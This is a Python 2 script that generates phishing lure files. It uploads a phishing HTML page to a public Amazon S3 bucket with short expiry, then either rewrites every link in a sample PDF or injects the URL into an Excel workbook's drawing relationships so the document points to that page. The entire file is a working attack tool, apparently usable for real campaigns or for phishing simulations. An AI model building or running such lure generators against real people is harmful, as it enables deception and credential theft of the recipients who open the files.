import pdfrw
import os
import mimetypes
import time
import urlparse
import argparse
import zipfile
import shutil
from datetime import datetime, timedelta
from boto.s3.connection import S3Connection

BUCKET_NAME = "----- * add here the backet name for s3 (amazon) * -----"
PREFIX = "phishing_inside_file"
AWS_LINK = "----- * add here the link for s3 (amazon) * -----"
MAIN_DIR = os.path.dirname(os.path.abspath(__file__))
HTML_TEMP = os.path.join(MAIN_DIR, "templates", "index.html")
EXPIRES = 2
OUTPUT_FOLDER = os.path.join(MAIN_DIR, "output")
OUTPUT_FILE = "pdf_sample_with_phishing.pdf"
OUTPUT_FILE_XLSX = "xlsx_sample_with_phishing.xlsx"
PDF_SAMPLE = os.path.join(MAIN_DIR, "templates", "sample.pdf")
XLSX_SAMPLE = os.path.join(MAIN_DIR, "templates", "sample.xlsx")
XML_TMP = os.path.join(MAIN_DIR, "templates", "drawing1.xml.rels")
ORIG_XML_PATH = os.path.join("xl","drawings","_rels", "drawing1.xml.rels")
TMP = os.path.join(MAIN_DIR, "tmp")


def zipdir(path, ziph):
    abs_src = os.path.abspath(path)
    for root, dirs, files in os.walk(path):
        for f in files:
            absname = os.path.abspath(os.path.join(root, f))
            arcname = absname[len(abs_src) + 1:]
            ziph.write(absname, arcname)
    ziph.close()


def generate_xlsx_file(phish_url):

    zip = zipfile.ZipFile(XLSX_SAMPLE)
    if not os.path.exists(TMP):
        os.mkdir(TMP)
    zip.extractall(TMP)
    #remove original xml file
    xml_file = os.path.join(TMP, ORIG_XML_PATH)
    os.remove(xml_file)

    with open(XML_TMP, 'rb') as xml_temp:
        with open(xml_file, 'wb') as new_xml:
            new_xml.write(xml_temp.read().format(phish_url))

    file_path = os.path.join(OUTPUT_FOLDER, OUTPUT_FILE_XLSX)
    if not os.path.exists(OUTPUT_FOLDER):
        os.mkdir(OUTPUT_FOLDER)

    if os.path.exists(file_path):
        os.remove(file_path)

    zipdir(TMP,  zipfile.ZipFile(file_path, "w", zipfile.ZIP_DEFLATED))
    shutil.rmtree(TMP)
    return file_path


def generate_pdf_file(phish_url):
    pdf = pdfrw.PdfReader(PDF_SAMPLE)
    new_pdf = pdfrw.PdfWriter()
    for page in pdf.pages:
        for annot in page.Annots or []:
            if annot.A and annot.A.URI:
                new_url = pdfrw.objects.pdfstring.PdfString("({})".format(phish_url))
                # Override the URL with the phishing.
                annot.A.URI = new_url
        new_pdf.addpage(page)

    file_path = os.path.join(OUTPUT_FOLDER, OUTPUT_FILE)
    if not os.path.exists(OUTPUT_FOLDER):
        os.mkdir(OUTPUT_FOLDER)

    if os.path.exists(file_path):
        os.remove(file_path)

    new_pdf.write(file_path)
    return file_path


def generate_new_file(phish_url, file_type):

    if file_type == 'xlsx':
        file_path = generate_xlsx_file(phish_url)
    elif file_type == 'pdf':
        file_path = generate_pdf_file(phish_url)

    print "\nNew sample has been created in output folder: {}".format(os.path.join(OUTPUT_FOLDER, file_path))


def upload_new_phish_html(aws_access_key, aws_secret_key):
    conn = S3Connection(aws_access_key, aws_secret_key)
    bucket = conn.get_bucket(BUCKET_NAME)
    files_list = bucket.get_all_keys(prefix=PREFIX)
    if files_list > 1:
        for key in files_list[1:]:
            bucket.delete_key(key)

    html_name = "index_{}.html".format(time.strftime("%Y%m%d%H%M%S"))
    key = bucket.new_key("{}/{}".format(PREFIX, html_name))
    key.set_contents_from_filename(os.path.join("templates", "index.html"))
    key.set_acl('public-read')
    content_type, unused = mimetypes.guess_type(key.name)
    if not content_type:
        content_type = 'text/plain'
    expires = datetime.utcnow() + timedelta(days=EXPIRES)
    expires = expires.strftime("%a, %d %b %Y %H:%M:%S GMT")
    metadata = {'Expires': expires, 'Content-Type': content_type}
    print key.name, metadata
    key.copy(BUCKET_NAME, key, metadata=metadata, preserve_acl=True)
    return urlparse.urljoin(AWS_LINK, html_name)


def main(opt):

    new_link = upload_new_phish_html(opt.aws_access_key, opt.aws_secret_key)
    generate_new_file(new_link, opt.type)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Generate files with phishing url')
    parser.add_argument('-t', '--type', action='store', choices=["pdf", "xlsx"], help='Select file type to genrate',
                        required=True)
    parser.add_argument('--aws_access_key', help='Set access key', required=True)
    parser.add_argument('--aws_secret_key', help='Set secret key', required=True)
    args = parser.parse_args()
    main(args)
